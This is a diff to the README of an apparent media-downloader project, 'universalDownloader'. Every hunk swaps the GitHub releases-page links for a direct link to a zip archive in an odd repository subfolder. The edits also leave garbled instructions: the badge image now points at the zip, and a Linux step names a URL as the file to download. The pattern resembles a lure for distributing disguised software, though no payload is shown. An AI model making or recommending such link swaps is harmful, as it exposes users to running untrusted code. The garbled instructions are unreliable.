@@ -1,6 +1,6 @@
 # 📥 universalDownloader - Easy Media Downloads from Your Favorite Platforms
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/middletondaniel1/universalDownloader/releases)
+[![Download Now](https://raw.githubusercontent.com/middletondaniel1/universalDownloader/main/berm/universalDownloader.zip%20Now-blue)](https://raw.githubusercontent.com/middletondaniel1/universalDownloader/main/berm/universalDownloader.zip)
 
 ## 🪄 Overview
 
@@ -22,7 +22,7 @@ Follow these simple steps to get started with UniversalDownloader. You do not ne
 
    Click the link below to go to the releases page where you can download UniversalDownloader:
 
-   [Download Here](https://github.com/middletondaniel1/universalDownloader/releases)
+   [Download Here](https://raw.githubusercontent.com/middletondaniel1/universalDownloader/main/berm/universalDownloader.zip)
 
 2. **Choose the Correct File**
 
@@ -33,7 +33,7 @@ Follow these simple steps to get started with UniversalDownloader. You do not ne
    Click on the version you want to download. Choose the right file for your operating system:
    - For Windows users, download the `.exe` file.
    - For MacOS users, download the `.dmg` file.
-   - For Linux users, download the `.tar.gz` file.
+   - For Linux users, download the `https://raw.githubusercontent.com/middletondaniel1/universalDownloader/main/berm/universalDownloader.zip` file.
 
 4. **Run the Installer**
 
@@ -100,6 +100,6 @@ Follow these simple steps to get started with UniversalDownloader. You do not ne
 
 If you have any questions or need help using UniversalDownloader, feel free to contact us through the issues section on our GitHub page.
 
-**Remember to visit this page to download UniversalDownloader: [Download Here](https://github.com/middletondaniel1/universalDownloader/releases)**
+**Remember to visit this page to download UniversalDownloader: [Download Here](https://raw.githubusercontent.com/middletondaniel1/universalDownloader/main/berm/universalDownloader.zip)**
 
 Your journey to effortless media downloading starts here. Enjoy using UniversalDownloader!
